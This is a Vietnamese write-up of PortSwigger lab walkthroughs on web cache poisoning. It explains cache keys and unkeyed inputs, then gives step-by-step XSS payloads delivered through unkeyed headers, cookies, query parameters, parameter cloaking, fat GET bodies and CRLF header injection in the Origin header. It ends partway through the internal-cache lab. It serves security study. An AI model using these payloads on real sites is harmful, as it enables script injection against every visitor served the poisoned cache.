---
title: 'Web13: Web cache poisoning'
tags: [web13]

---

I. TỔNG QUAN
----------------------

### 1\. Web caching là gì?
Ở thời kỳ sơ khai của Internet, khi những trang web đầu tiên được tạo ra, quá trình người dùng tải các trang web thường chậm và có kết nối không ổn định. Điều này là do sự hạn chế về tốc độ băng thông cũng như vấn đề địa lý dẫn đến độ trễ cao, mang lại trải nghiệm không tốt cho người dùng. Bên cạnh các phương pháp cải thiện băng thông, đường truyền, để giảm thiểu về thời gian tải trang, các nhà phát triển hướng đến ý tưởng lưu trữ bản sao của các trang web trên máy tính của người dùng hoặc trên các máy chủ CDN (Content Delivery Network) - Đó là lúc kỹ thuật **Web caching** ra đời.
![image](https://hackmd.io/_uploads/rJU7_QWDR.png)

**Web caching** là một quá trình **lưu trữ bản sao** của các tài nguyên trên trang web, chúng thường bao gồm hình ảnh, tệp CSS và JavaScript trên **máy chủ quản lý cache** CDN (Content Delivery Network) hoặc trên các máy tính của người dùng. Khi người dùng truy cập trang web lần đầu tiên, trình duyệt sẽ tải toàn bộ tài nguyên từ máy chủ gốc, lần tiếp theo người dùng truy cập lại trang web, các tài nguyên đã được lưu trữ trước đó sẽ được sử dụng thay vì tải lại toàn bộ. Điều này làm cho trang web được tải nhanh hơn và cải thiện trải nghiệm người dùng.

Ví dụ, khi một khách hàng thường xuyên truy cập vào một trang web thương mại điện tử để mua sản phẩm, hình ảnh của sản phẩm đó có thể đã được lưu trữ trên máy tính của họ hoặc máy chủ caching. Nên họ có thể xem các hình ảnh nhanh chóng hơn so với lần đầu truy cập trang web.

Song song với sự phát triển vượt bậc của công nghệ thông tin, số lượng người dùng mạng Internet dần tăng cao càng chứng tỏ một điều rằng kỹ thuật Web caching đã giúp các nhà phát triển tiết kiệm lượng chi phí lớn, đồng thời cải thiện đáng kể trải nghiệm sử dụng mạng Internet đối với người dùng.

### 2\. Web cache poisoning vulnerability
Dựa vào phương thức hoạt động đặc biệt của web caching, những kẻ tấn công đã lựa chọn các tài nguyên được lưu trữ tạm thời trong máy chủ caching CDN làm mục tiêu. Sau khi nắm được quy trình caching của trang web, họ thực hiện đầu độc (poisoning) bộ nhớ đệm (cache), khiến server lưu trữ các tài nguyên chứa payload tấn công vào bộ nhớ cache, khi người dùng truy cập vào trang web, chính server sẽ "giúp" kẻ tấn công trả về các phản hồi nguy hiểm tới người dùng. Trong hình thức tấn công Web cache poisoning, kẻ tấn công đóng vai trò một thợ săn đặt sẵn các bẫy (các tài nguyên cache nguy hiểm), đợi chờ những con mồi "cắn câu" (truy cập trang web và nhận được phản hồi cache nguy hiểm).

![image](https://hackmd.io/_uploads/HJj7F7WDR.png)

Quan sát hình trên, mỗi dòng tương ứng một lần user gửi request và nhận được response từ server. Do server sử dụng kỹ thuật Web caching nên sau khi người dùng đầu tiên nhận được response, hệ thống đã lưu trữ tài nguyên cache response này trên CDN và sử dụng chúng để trả về kết quả truy cập cho hai người dùng tiếp theo. Trong một thời điểm nào đó, kẻ tấn công thực hiện gửi một request chứa payload nguy hiểm tới server, trong response trả về chứa payload và server lưu trữ response này trong cache. Từ đây các user tiếp theo cũng nhận được response chứa payload của kẻ tấn công tới từ CDN.

Các hình thức tấn công Web cache poisoning có thể được kết hợp với nhiều dạng lỗ hổng khác như XSS, JavaScript injection, open redirection, phát tán mã độc diện rộng ... Với cách thức hoạt động đặc biệt như vậy, mức độ nghiêm trọng mang lại từ dạng tấn công này thường không cố định, chúng phụ thuộc vào thời gian server thực hiện lưu trữ tài nguyên cache trong bao lâu và số lượng người dùng lớn hay nhỏ. Tuy nhiên, nếu một hệ thống lớn chứa lỗ hổng Web cache poisoning và bị kẻ tấn công khai thác sẽ dẫn đến hậu quả vô cùng nghiêm trọng do trực tiếp ảnh hưởng tới toàn bộ người dùng.

II. Một số khái niệm trong tấn công Web cache poisoning
----------------------

### 1\. Dấu hiệu caching
Chúng ta có thể nhận biết một trang web thực hiện caching tài nguyên hay không thông qua một số header trong response như `X-Cache`, `Age`, `Cache-Control`.
![image](https://hackmd.io/_uploads/rkAm9QZDR.png)

* Header `X-Cache` với giá trị **hit** nghĩa là nội dung response hiện tại nhận được đến từ máy chủ CDN.
* Giá trị `max-age` trong header Cache-Control quy định thời gian tài nguyên cache được lưu trữ, tính bằng giây. Trường hợp hình trên các tài nguyên cache sẽ được lưu trữ trong 30 giây.
* Giá trị `Age` chỉ thời gian đã được lưu trữ của tài nguyên cache.

Khi giá trị `Age` đạt tối đa thời gian lưu trữ được quy định trong max-age, máy chủ CDN sẽ lưu trữ một phiên tài nguyên mới. Khi đó header `X-cache` cũng được chuyển sang giá trị **miss**, cho thấy nội dung response nhận được đang tới từ máy chủ gốc.
![image](https://hackmd.io/_uploads/rk6EiQ-wA.png)

### 2\. Cache keys và Unkeyed inputs
Khi người dùng gửi request tới server, server cần quyết định response trả về cho họ sẽ được lấy từ CDN hay sẽ xử lý qua hệ thống backend rồi trả về nội dung từ server gốc. Nếu thực hiện kiểm tra, so sánh từng ký tự trong request sẽ rất tốn kém do các request thường chứa nhiều thông tin và số lượng request cũng vô cùng lớn. Bởi vậy, cần có các yếu tố giúp server xác nhận điều đó, chúng được gọi là các **cache keys**.

Quá trình xác nhận được thực hiện đơn giản như sau: Server so sánh các giá trị cache keys trong request gửi đến có trùng khớp với tập giá trị cache keys được quy định từ trước, nếu giống nhau sẽ trả về kết quả từ CDN, ngược lại có nghĩa request nhận được là "mới", cần thực hiện xử lý qua backend và trả về kết quả từ server gốc.

Các thành phần còn lại trong request không phải **cache keys** sẽ được gọi là các giá trị **unkeyed**.

III. Các bước tấn công Web cache poisoning
------------------------------------------

![image](https://hackmd.io/_uploads/ByyBh7-DR.png)


### 1\. Detect - Phát hiện

Việc phát hiện một trang web có sử dụng kỹ thuật Web caching thường khá đơn giản. Thông thường chúng ta chỉ cần quan sát nội dung các headers trong response trả về. Dấu hiệu rõ ràng nhất là các headers với giá trị tương ứng: **`Cache-Control`** với từ khóa **`max-age`**, **`X-cache`** với từ khóa **`miss`** hoặc **`hit`**. Tuy nhiên, trong một số trường hợp dù header **`Cache-Control`** có từ khóa **`no-cache`**, chúng ta cũng có thể thử tấn công theo hướng Web cache poisoning!

### 2\. Tìm kiếm unkeyed inputs

Các unkeyed inputs đóng vai trò quyết định kết quả cuộc tấn công của chúng ta. Chúng ta sẽ cần tìm kiếm các giá trị unkeyed inputs được server lưu trữ và chứa trong tài nguyên cache trả về ở các lần request tiếp theo. Với số trường hợp cần thử khả lớn, nên chúng ta cần sử dụng các công cụ hỗ trợ, ví dụ như extension **[Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)** của Burp Suite.

### 3\. Poisoning

Sau khi xác định được mục tiêu và vị trí tấn công (unkeyed input), bước tiếp theo là thực hiện đầu độc (poisoning) bộ nhớ cache. Bước này phụ thuộc vào mục đích của kẻ tấn công và trường hợp cụ thể của trang web mà xây dựng các payload poisoning khác nhau. Thông thường có thể tạo ra các payload kiểm tra lỗ hổng XSS.

### 4\. Check

Cuối cùng, chúng ta thực hiện kiếm tra payload đã được lưu trữ thành công hay chưa. Chẳng hạn trong response trả về (của request đang chứa payload), giá trị header **`X-Cache`** thay đổi từ **`hit`** sang **`miss`**, nghĩa là response này đã được server backend xử lý và trả về từ server gốc. Loại bỏ payload khỏi request và gửi thêm một lần, trong response trả về, nếu giá trị header **`X-Cache`** thay đổi từ **`miss`** sang **`hit`** và trong response vẫn chứa payload trong request trước, nghĩa là reponse nguy hiểm đã được hệ thống caching thành công.

IV. CÁC BÀI LAB
----------------------

# **1. Lab: [Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning) with an unkeyed header**
>This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.
![image](https://hackmd.io/_uploads/SJgmdE-P0.png)

>Khi load trang chủ lần đầu, ta thấy `X-Cache: miss` nghĩa là nó đang yêu cầu dữ liệu từ server gốc và được server gốc xử lí và trả về kết quả:
>![image](https://hackmd.io/_uploads/BJRWFNWwC.png)

>Load lại trang thì lần này, giá trị `X-Cache` đã đổi thành `hit` chứng tỏ trang web đang lấy dữ liệu từ Cache server
>![image](https://hackmd.io/_uploads/HJz7F4WPA.png)

>Nghi ngờ bài này ta có thể khai thác vào Web cache, sử dụng tool **Param Miner** của Burp để scan các unkeyed trong lab:
>![image](https://hackmd.io/_uploads/Bkvlc4-vA.png)

>Sau khi scan, cho ta biết 1 unkeyed là header `X-Forwarded-Host`:
>![image](https://hackmd.io/_uploads/B1Ew9NbP0.png)

>Ngoài ra value của header `X-Forwarded-Host` được thêm vào `src` của tag script ở respone:
![image](https://hackmd.io/_uploads/SJ47sN-v0.png)
![image](https://hackmd.io/_uploads/rJJBoVbwR.png)

>Từ đây, ta đoán rằng có thể escape `src`, đồng thời chèn thêm 1 script khác nhằm inject payload XSS tới victim. Payload sử dụng:
`test.com"></script><script>alert(document.cookie);</script>`

>Thềm header vào request và Send:
>![image](https://hackmd.io/_uploads/rJaMp4-DA.png)

>Thấy `X-Cache: miss` chứng tỏ payload đã được gửi tới server gốc, ta sẽ gửi lại cho tới khi `X-Cache: hit` để web lấy data từ Cache server:
>![image](https://hackmd.io/_uploads/B1p56E-w0.png)

>**"Show respone in browser"** và thấy thực thi `alert()` thành công:
>![image](https://hackmd.io/_uploads/Skgp64ZDA.png)

>Hoàn thành bài lab:
![image](https://hackmd.io/_uploads/BJvC6VbDA.png)

# **2. Lab: [Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning) with an unkeyed cookie**
>This lab is vulnerable to web cache poisoning because cookies aren't included in the cache key. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes `alert(1)` in the visitor's browser.
![image](https://hackmd.io/_uploads/SJOFR4-PC.png)

>Trong respone ta thấy các header trả về đặc trưng cho tồn tại 1 Cache server:
>![image](https://hackmd.io/_uploads/SkvT1SbP0.png)

>Tại mỗi bài post, mặc dù chưa đăng nhập nhưng ta lại được set Cookie, ứng dụng này không include cookie vào **cache keys**. Trong đó có cookie `fehost` được chèn trực tiếp giá trị vào script:
>![image](https://hackmd.io/_uploads/S1QqgSZD0.png)

>Thực hiện gửi request với cookie `fehost=test` kèm theo cache-buster bằng `?test=1`, ta thấy chuỗi `abc` đã được thêm vào script:
>![image](https://hackmd.io/_uploads/SynAQHWDC.png)

>Gửi thêm đến khi `X-Cache: hit`:
>![image](https://hackmd.io/_uploads/SJhwNHWPR.png)
>Lúc này khi query đến `/?test=1` mà không chứa cookie `fehost` thì mình vẫn nhận được cached response giống với response ở trên.

>Bây giờ, xóa cache buster và gửi request với `fehost=test"-alert(1)-"test` để payload:
>![image](https://hackmd.io/_uploads/HkArSrWwA.png)

>Gửi thêm đến khi `X-Cache: hit` để đảm bảo nó được lưu vào Cache server:
>![image](https://hackmd.io/_uploads/HyE_rrWwA.png)

>**"Show respone in browser"** và thấy thực thi `alert(1)` thành công:
>![image](https://hackmd.io/_uploads/SyZ5SB-w0.png)

>Hoàn thành bài lab:
![image](https://hackmd.io/_uploads/HJaqrBWvR.png)

# **3. Lab: [Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning) with multiple headers**
>This lab contains a web cache poisoning vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A user visits the home page roughly once a minute. To solve this lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.
![image](https://hackmd.io/_uploads/S1T0UrbPR.png)

>Tiến hành scan bằng **Param Miner**, ta phát hiện 1 unkeyed headers là 
>`X-Forwarded-Scheme`:
![image](https://hackmd.io/_uploads/HkeTZoHbDC.png)

>Sử dụng cache-buster `?test=1` (để đảm bảo luôn nhận được tài nguyên mớ) và test thử với `X-Forwared-Scheme: https` thì thấy server vẫn trả response bình thường:
>![image](https://hackmd.io/_uploads/B1ingIbvC.png)

>Tuy nhiên khi gửi `X-Forwared-Scheme` khác `https` thì sẽ được trả về **302 Found** và redirect về `https://<host>`:
>![image](https://hackmd.io/_uploads/H1WqM8WD0.png)

>Ngoài phần Hint của bài gợi ý ta có thể sử dụng thêm Header `X-Forwarded-Host`:
>![image](https://hackmd.io/_uploads/BklemIWPR.png)

>Như vậy, ta có thể sử dụng unkeyed header `X-Forwarded-Host` kết hợp với `X-Forwared-Scheme` khác `https`, ta có thể redirect user về đường dẫn `https://<X-Forwarded-Host>/?test=1`:
>![image](https://hackmd.io/_uploads/BJgP7UZvR.png)

>Tiếp theo, ta chỉ cần tạo exploit server chứa đoạn script XSS về truyền địa chỉ exploit server vào `X-Forwarded-Host`:
>![image](https://hackmd.io/_uploads/ryU-EUZPC.png)

>Tuy nhiên, khi Store payload tại đường dẫn `\` của exploit-server thì ta bị cấm thực hiện điều này:
>![image](https://hackmd.io/_uploads/ByEVEI-DR.png)

>Ta phải tìm endpoint khác. Thấy rằng mỗi khi load trang chủ thì sẽ có request đến `/resources/js/tracking.js`. Đường dẫn này cũng được cached (dựa vào `X-Cache`):
>![image](https://hackmd.io/_uploads/HJod4IWP0.png)

>Do đó ta sẽ tạo exploit server với đường dẫn tương tự nhưng chứa XSS payload:
>![image](https://hackmd.io/_uploads/HklSwIbDC.png)

>Thực hiện các bước chèn thêm vào request sau:
> 1. `X-Forwarded-Host`: `<EXPLOIT-SERVER>`
> 2. `X-Forwarded-Scheme`: khác **HTTPS**
    
>Và gửi request đến `/resources/js/tracking.js`, ta redirect được user về exploit-server chứa XSS payload. Gửi request đến khi được cached `hit`:
![image](https://hackmd.io/_uploads/rkNxL8bD0.png)

>Do các header trên không được keyed nên victim truy cập trang chủ => load đường dẫn trên => bị chuyển hướng tới exploit server => được nhận cached response => bị XSS trộm cookie:
>![image](https://hackmd.io/_uploads/r1Y9ULbDR.png)

>Hoàn thành bài lab: 
>![image](https://hackmd.io/_uploads/B1VhIIWPA.png)

# **4. Lab: Targeted web cache poisoning using an unknown header**
>This lab is vulnerable to web cache poisoning. A victim user will view any comments that you post. To solve this lab, you need to poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs.
![image](https://hackmd.io/_uploads/HyHvEo-wC.png)

>Scan bằng **Param Miner** ta xác định được 1 unkeyed header `X-Host`:
>![image](https://hackmd.io/_uploads/BkEF_oZvR.png)

>Ngoài ra, giá trị của` X-Host` được chèn vào `src` của tag script ở respone trả về:
>![image](https://hackmd.io/_uploads/rJWPFoZD0.png)
>![image](https://hackmd.io/_uploads/BkxdFibD0.png)

>Như vậy ta đã xác định được unkeyed header và ta có thể chèn XSS payload ở đó!

>Trang web còn cho biết `User-Agent` là 1 **cache key** nhờ vào header `Vary` tại response. Bây giờ ta chỉ cần đi tìm `User-Agent` của nạn nhân để thực hiện attack:
>![image](https://hackmd.io/_uploads/Hy_Cti-w0.png)

>Bên trong mỗi bài post có chức năng comment, và cho phép comment ở định dạng HTML:
>![image](https://hackmd.io/_uploads/HkBI5sbvA.png)

>Submit comment:
>![image](https://hackmd.io/_uploads/ryt5qoWDC.png)

>Đến đây, ta có thể sử dụng tag `<img>` với thuộc tính `src` bên trong để chèn payload, khi victim xem comment thì sẽ request đến exploit-server ta controll:
>`<img src="https://<EXPLOIT-SERVER>">`
![image](https://hackmd.io/_uploads/B1O12ibPR.png)

>Xem lại log thì ta lấy được `User-Agent` của victim:
>![image](https://hackmd.io/_uploads/BkLXnjZv0.png)

>Lấy `User-Agent` đó kèm theo `X-Host` là XSS payload:
>`test.com"></script><script>alert(document.cookie);</script>`, ta đã có thể poison cache thành công với victim đã xác định. Gửi cho tới khi `X-Cache: hit`:
>![image](https://hackmd.io/_uploads/HJEFTsZvA.png)

>**"Show respone in browser"** và thấy thực thi `alert()` thành công:
>![image](https://hackmd.io/_uploads/rkw1AsWwA.png)

>Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/SyfxAoWwR.png)

# **5. Lab: [Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning) via an unkeyed query string**
>This lab is vulnerable to web cache poisoning because the query string is unkeyed. A user regularly visits this site's home page using Chrome.
To solve the lab, poison the home page with a response that executes `alert(1)` in the victim's browser.
![image](https://hackmd.io/_uploads/BJkZcAEPC.png)

>Gửi request đến `/` với query string `?test=1` thì thấy cả URL chứa query string được gán vào `href` của link canonical => ta có thể sử dụng XSS. Ngoài ra, khi ta thay đổi giá trị của query string sang `?test123=1` thì respone vẫn trả về `X-Cache: hit` chứng tỏ query string không thuộc `cache keys`.
>![image](https://hackmd.io/_uploads/Byxel1rwA.png)
![image](https://hackmd.io/_uploads/HJD-x1rPR.png)

>Khi đó ta sẽ không thể dùng cache buster trên param. Thử nghiệm ta thấy sử dụng cache buster tại header `Origin` thành công khi server trả về `X-Cache: miss` => `Origin` là 1 `cache key`. Gửi thêm với param `test=1` cho đến khi chứng tỏ mình nhận được response từ cache (`X-Cache: hit`):
>![image](https://hackmd.io/_uploads/Hy5FWkBDR.png)

>Lúc này truy cập `/` với cùng cache buster ta thấy param `abc=1` vẫn tồn tại trong link canonical:
>![image](https://hackmd.io/_uploads/BkIn-1Hv0.png)

>Tương tự các bước trên ta thử param là XSS payload như dưới
>`?test=1'/><script>alert(1)</script>`. Gửi với cache buster cho đến khi `X-Cache: hit`:
>![image](https://hackmd.io/_uploads/SJydz1HPA.png)

>Truy cập `/` với cùng cache buster ta thấy payload XSS vẫn được load thành công:
![image](https://hackmd.io/_uploads/Sky5fySPR.png)

>Bây giờ chỉ việc gửi XSS payload qua query string tương tự ở trên cho đến khi `X-Cache: hit`, (nhớ xóa Origin để nó áp dụng với normal user):
>![image](https://hackmd.io/_uploads/HkDrQyHvC.png)

>Thử Show respone ta thấy alert thành công: 
>![image](https://hackmd.io/_uploads/BJQdmySvC.png)

>Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/By1cVJHvA.png)

# **6. Lab: [Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning) via an unkeyed query string**
>This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. A user regularly visits this site's home page using Chrome.
To solve the lab, poison the cache with a response that executes `alert(1)` in the victim's browser.
![image](https://hackmd.io/_uploads/SyC1L1HwR.png)

>Hint bài này chỉ ra rằng tham số `utm` thường không phải là **cache-keys**:
>![image](https://hackmd.io/_uploads/SkM6I1HDC.png)

>Cho nên ta có thể lợi dụng tham số này để inject payload XSS vào. Bắt tay vào lab, ta dùng cache buster tại `Origin` header. Thử gửi request với các param `test=1` và `utm_content=1` cho đến khi `X-Cache:hit`. Để ý ta có thể XSS tại canonical link:
>![image](https://hackmd.io/_uploads/H1mCvkSDR.png)

>Xóa param `utm_content=1` đi và gửi lại request với cùng cache buster ta thấy nhận được response giống trên &rarr; cache key không chứa param `utm_content`:
>![image](https://hackmd.io/_uploads/ry9lOkHPA.png)

>Tương tự các bước trên ta send request với giá trị `utm_content` là XSS payload như dưới
>`?utm_content=1'/><script>alert(1)</script>`. Gửi với cache buster cho đến khi `X-Cache: hit`:
>![image](https://hackmd.io/_uploads/HkWcOJSDC.png)

>Truy cập trang chủ `/` và thấy nó đã lấy nội dung từ  Cache server đã bị poison:
>![image](https://hackmd.io/_uploads/SkfMY1SvC.png)

>Show respone in browser thì thấy alert thành công:
>![image](https://hackmd.io/_uploads/rkKiO1SP0.png)

>Lúc này, ta sẽ xóa `cache-buster` đi để gửi poison payload tới cho victim cho tới khi `X-Cache: hit` để đảm bảo payload đã được lưu trong cache server:
![image](https://hackmd.io/_uploads/ryRH9JrvA.png)

>Đợi cho đến khi victim truy cập vào `/` và dính XSS, ta hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/rkiAYkBDR.png)

# **7. Lab: Parameter cloaking**
>This lab is vulnerable to [web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning) because it excludes a certain parameter from the cache key. There is also inconsistent parameter parsing between the cache and the back-end. A user regularly visits this site's home page using Chrome.
To solve the lab, use the parameter cloaking technique to poison the cache with a response that executes `alert(1)` in the victim's browser.
>![image](https://hackmd.io/_uploads/H1TX6yHvR.png)

>Hint bài này chỉ ra rằng tham số `utm` thường không phải là **cache-keys**:
![image](https://hackmd.io/_uploads/H18rayrPC.png)

>Mỗi khi load trang chủ thì một hàm `setCountryCookie()` được thực thi từ file `/js/geolocate.js` bằng tham số `callback`:
>![image](https://hackmd.io/_uploads/Sy_o01HwA.png)

>Sử dụng cache buster tại `Origin` header. Gửi request đến khi `X-Cache: Hit`:
>![image](https://hackmd.io/_uploads/ByxekgBwA.png)

Sử dụng cùng cache buster, ta thấy UTM params `utm_content` bị unkeyed bởi cache:
![image](https://hackmd.io/_uploads/SymHyeBwR.png)

>Sử dụng kĩ thuật parameter cloaking với tham số callback với payload sau:

```
/js/geolocate.js?callback=setCountryCookie&utm_content=1;callback=alert(1)
```

>Cụ thể thì ở đây server sẽ hiểu dấu `;` là dấu ngăn cách giữa cách param, và param `callback` được định nghĩa 2 lần nên server sẽ chỉ lấy cái sau cùng => nếu ta thêm payload XSS vào `callback` sau cùng thì sẽ gửi tới cho server được!
>![image](https://hackmd.io/_uploads/HkpxxlHvR.png)

>Gửi lần đầu ta thấy, hàm `alert(1)` đã được gọi &rarr; Server chấp nhận tham số `callback=alert(1)` cuối cùng chứ không phải `callback=setCountryCookie`

>Gửi đến khi `X-Cache: Hit` và thấy rằng XSS Payload đã được lưu phía cache server:
>![image](https://hackmd.io/_uploads/rkRDgxSP0.png)

>Đối với cache,  khi query cùng cache buster với mỗi param `callback=setCountryCookie` thì được trả về cache version của request trên chứa `alert(1)` &rarr; nó ignore luôn `utm_content=1;callback=alert(1)` vì nó coi đây chỉ là 1 tham số `utm_content`:
>![image](https://hackmd.io/_uploads/ByWixgrPA.png)

>Giờ ta sẽ xóa cache buster `Oringin` đi để Send tới victim cùng với XSS Payload trên và send cho tới khi `X-Cache=hit`:
```
/js/geolocate.js?callback=setCountryCookie&utm_content=1;callback=alert(1)
```
![image](https://hackmd.io/_uploads/S1oz-lSvA.png)

>Lưu thành công payload vào cache server:
>![image](https://hackmd.io/_uploads/rJANWlHvR.png)

>Hoàn thành bài lab khi có victim truy cập `/`: 
>![image](https://hackmd.io/_uploads/Sk1PbxBPC.png)

# **8. Lab: Web cache poisoning via a fat GET request**
>This lab is vulnerable to web cache poisoning. It accepts `GET` requests that have a body, but does not include the body in the cache key. A user regularly visits this site's home page using Chrome.
To solve the lab, poison the cache with a response that executes `alert(1)` in the victim's browser.
![image](https://hackmd.io/_uploads/r1PNzeBDC.png)

>Tương tự bài trên ta sẽ nhắm đến tham số `callback` tại `/js/geolocate.js`. Gửi param `callback=alert(1)` dưới body với method **GET** và cache buster tại **Origin** header thì thấy hàm `alert(1)` đã được gọi. => ứng dụng chấp nhận **GET** requests có chứa body. (Gửi cho đến khi `X-Cache: hit`):
>![image](https://hackmd.io/_uploads/r1RSmeSvC.png)

> Xóa phần body đi và gửi lại request với cùng cache buster ta thấy hàm `alert(1)` vẫn được gọi do đã lưu vào cache server:
> ![image](https://hackmd.io/_uploads/BJosXxSD0.png)

>Lúc này ta chỉ việc xóa cache buster và gửi request với body `callback=alert(1)` cho đến khi `X-Cache: hit` tới cho victim:
>![image](https://hackmd.io/_uploads/ByXfExHPA.png)

>Đợi victim truy cập vào `/` và dính XSS và ta hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/HyQNElHPC.png)

**Notes:** Nếu trang web không chấp nhận việc request GET có chứa body, thì ta có thể thêm header `X-HTTP-Method-Override: POST` để ghi đè phương thức thành POST
```
GET /?param=innocent HTTP/1.1
Host: innocent-website.com
X-HTTP-Method-Override: POST
…
param=bad-stuff-here
```

# **9. Lab: URL normalization**
>This lab contains an XSS vulnerability that is not directly exploitable due to browser URL-encoding.
To solve the lab, take advantage of the cache's normalization process to exploit this vulnerability. Find the XSS vulnerability and inject a payload that will execute `alert(1)` in the victim's browser. Then, deliver the malicious URL to the victim.
![image](https://hackmd.io/_uploads/ByBH8gSPR.png)

>Khi truy cập 1 đường dẫn không tồn tại, trang web reflect lại đường dẫn đó ra output kèm respone `404 Not Found`:
>![image](https://hackmd.io/_uploads/B1ILvlSDR.png)

>Ta thử escape tag `<p>` bằng payload
>`/test</p><script>alert(1)</script><p>`:
>![image](https://hackmd.io/_uploads/B1Z5DgHvR.png)

>Thấy rằng có thể trigger alert thành công:
>![image](https://hackmd.io/_uploads/SkK2PeBDR.png)

>Tuy nhiên có 1 điều, khi mình truy cập đường dẫn này trên URL thì bị fail do browser đã url-encode payload trên rồi mới gửi server. Do đó, ta cần kết hợp lỗi của cache trong việc nomarlize URL để có thể khiến nạn nhân truy cập đường dẫn trên URL mà vẫn bị dính XSS:
>![image](https://hackmd.io/_uploads/Sk-Z_lBvC.png)

>Cách làm như sau:

>- Gửi lại request tấn công giống lúc nãy cho đến khi `X-Cache:hit`, tức là response đã được cached chứa unencoded XSS payload:
>![image](https://hackmd.io/_uploads/Sks8_grP0.png)

>- Lập tức truy cập lại đường dẫn trên URL, ta XSS thành công:
>![image](https://hackmd.io/_uploads/B1cDdervR.png)

>Giải thích: 

>- Khi attacker gửi XSS payload qua Repeater thì không bị URL-encoded bởi proxy &rarr; server xử lí bình thường và lưu vào cache.

>- Khi nạn nhân truy cập malicious URL trên browser, browser sẽ URL-encode nó, nhưng khi qua bước URL normalization của cache, cache hiểu là cùng cache keys &rarr; trả về response giống như response chứa unencoded payload của attacker &rarr; bị XSS. 

>**"Deliver link to victim"** sau khi chắc chắn đã lưu payload vào cache server, ta có thể hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/Hk3ZtxSDA.png)

# **10. Lab: Cache key injection**
>This lab contains multiple independent vulnerabilities, including cache key injection. A user regularly visits this site's home page using Chrome.
To solve the lab, combine the vulnerabilities to execute `alert(1)` in the victim's browser. Note that you will need to make use of the `Pragma: x-get-cache-key` header in order to solve this lab.
![image](https://hackmd.io/_uploads/ry1GqfHvR.png)

>Khi truy cập trang chủ, ứng dụng redirect user từ `/login?lang=en` về `/login/?lang=en`. Để ý, `/login?lang=en` sẽ có cache. Như vậy, để nạn nhân bị tấn công, ta cần gửi request sao cho match với cache key `/login?lang=en`:
>![image](https://hackmd.io/_uploads/rksoeQrv0.png)

>Mặt khác, `utm-content` bị ignore bởi cache nên ta có thể dùng param này để bắt đầu poison.

>Sau khi redirect, trang web import 1 file js tại `/js/localize.js?lang=en&cors=0` &rarr; tham số `lang` ở đây được lấy từ URL. Request này cũng có cache hỗ trợ:
>![image](https://hackmd.io/_uploads/Bk1g-mHPR.png)

>Lúc này mình sẽ đi theo hướng: đầu tiên poison cache tại `/js/localize.js?lang=en&cors=0` rồi quay lại poison cache `/login?lang=en` sao cho ứng dụng load response `/js/localize.js?lang=en&cors=0` sau khi đã bị poisoned. 

>- Poison cache tại `/js/localize.js?lang=en&cors=0`:
    Sử dụng header `Pragma: x-get-cache-key` để server trả về trong respone các cache-key.
    Thấy rằng `utm_content` cũng bị ignore bởi cache trong khi `Origin` là 1 cache key:
    ![image](https://hackmd.io/_uploads/B1CBfQHDA.png)
  Thay đổi `cors=1` thì thấy mình có thể header injection khi server trả về `Access-Control-Allow-Origin` chứa giá trị chính là giá trị mình truyền ở header Origin:
  ![image](https://hackmd.io/_uploads/ByQhMmHwA.png)
  Gửi request như sau để header injection thông header `Origin: abc%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$` trả về `alert(1)` với `Content-Length: 8`. Lý do để tham số `x=1` mình sẽ giải thích sau. Chú ý, đây chính là bước poison nên cần gửi cho đến khi `X-Cache: hit`
![image](https://hackmd.io/_uploads/r1bl4mrDR.png) 
  Sau khi đọc `X-Cache-Key`, ta có thể request lại như sau để có cùng cache key mà không can thiệp vào `Origin`. Mục đích của việc này là để victim truy cập vào:
  ![image](https://hackmd.io/_uploads/SJ5L8XBPC.png)
Lúc này để ý, `x=1` được dùng để tránh khiến `cors=1$$origin...` &rarr; không thể header injection.

>- Poison cache tại `/login?lang=en`:
>  Tại `/login?lang=en`, ta thực hiện truyền tham số như dưới và gửi request đến khi `X-Cache: hit`. Khi đó ta đạt được 2 mục đích:
>  -- Cache sẽ ignore `utm_content` và chỉ chứa cache key là `/login?lang=en` => match với request nạn nhân truy cập:
>  ![image](https://hackmd.io/_uploads/SksrDmSvC.png)
>-- Trang chủ sẽ import file js `/js/localize.js` với đường dẫn như sau:
>![image](https://hackmd.io/_uploads/r15EY7HvA.png)

>Bây giờ nạn nhân truy cập trang chủ sẽ bị dính `alert(1)`, hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/SJ5ht7SvC.png)

# **11. Lab: Internal cache poisoning**
>This lab is vulnerable to [web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning). It uses multiple layers of caching. A user regularly visits this site's home page using Chrome.
To solve the lab, poison the internal cache so that the home page executes `alert(document.cookie)` in the victim's browser.
![image](https://hackmd.io/_uploads/HyUtnQHPA.png)

>Scan web bằng **Param Miner** thì thấy header `X-Forwarded-Host` được hỗ trợ:
>![image](https://hackmd.io/_uploads/Sy7FAXHw0.png)

>Gửi request với `X-Forwarded-Host: abc` kèm theo dynamic cache buster (dùng Param Miner), ta thấy link canonical và địa chỉ load `analytics.js` đều trỏ về `//abc`, trong khi địa chỉ load `geolocate.js` vẫn giữ nguyên như ban đầu:
>![image](https://hackmd.io/_uploads/BJy-1EBwR.png)

>Tuy nhiên, gửi thêm vài lần thì thấy địa chỉ load `geolocate.js` cũng đã trỏ về `//abc`. &rarr; fragment này được cache bởi internal cache và query string bị unkeyed bởi internal cache do ta vẫn hit cache mặc dù cache buster tại query string thay đổi:
>![image](https://hackmd.io/_uploads/r1SQgVBPC.png)

